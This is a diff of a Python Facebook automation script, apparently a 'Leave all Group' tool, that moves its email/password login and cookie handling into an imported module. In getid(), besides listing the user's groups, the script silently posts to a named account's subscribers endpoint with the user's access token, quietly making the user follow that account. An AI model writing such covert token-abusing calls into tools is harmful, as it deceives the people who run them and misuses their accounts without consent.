@@ -1,6 +1,6 @@
 import requests,os,json,mechanize,time,click
 from http.cookiejar import LWPCookieJar as kuki
-from getpass import getpass
+from src import Genkuki
 
 class Lgrup:
 	def __init__(self):
@@ -22,38 +22,8 @@ class Lgrup:
 	; Leave all Group ;
 	; By: Kang-Newbie ;
 	;;;;;;;;;;;;;;;;;;;""")
-		print('\n[!] Checking cookies');time.sleep(1)
-		s = self.req
-		s.cookies = kuki('toket/kue.txt')
-		try:
-			fil=open('toket/kue.txt')
-			fil.close()
-		except FileNotFoundError:
-			print("[!] cookies not found\n\n[!] please login in your facebook once again")
-			email=input('[?] email/username: ')
-			pw=getpass('[?] password: ')
-			data = {'email':email,'pass':pw}
-			urrl='https://mbasic.facebook.com/login'
-			res = s.post(urrl,data=data).text
-			if 'm_sess' in str(res) or 'save-device' in str(res):
-				s.cookies.save()
-				click.pause()
-				self.getid()
-				exit()
-			else:
-				exit('[!] fail login into your account')
-		self.cek_kuki()
-		
-	def cek_kuki(self):
-		self.req.cookies=kuki('toket/kue.txt')
-		self.req.cookies.load()
-		cek=self.req.get('https://mbasic.facebook.com/me').text
-		if 'mbasic_logout_button' in cek:
-			print('[√] cookies found\n')
-			click.pause()
-			self.getid()
-		else:
-			print('[!] cookies invalid')
+		Genkuki.login(self)
+		self.getid()
 
 	def getid(self):
 		r=self.req.get('https://graph.facebook.com/me/groups?access_token='+self.ken);self.req.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+self.ken)
